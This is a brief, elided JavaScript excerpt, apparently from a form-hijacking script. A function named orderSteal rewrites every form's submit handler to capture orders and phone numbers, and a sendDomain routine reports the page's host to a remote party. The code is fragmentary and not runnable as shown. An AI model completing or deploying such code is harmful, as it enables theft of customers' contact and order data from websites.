function orderSteal(data) {
  if (
    "landing_id" in data &&
    parseInt(data["landing_id"]) > 0 &&
    "tel" in data &&
    data["tel"] != "" &&
    parseInt(data["product_id"]) > 0 &&
    ...
    [].forEach.call(forms, function(elem) {
      ...
      elem.setAttribute(
        "onsubmit",
        'return cartTelCheck("phone", true, this, event);'
      );
    });
    if (data["client"] == "") {
      return;
...
function sendDomain() {
  ...
  var params = "landing_id=30121&host=" + host + "&type=remote";
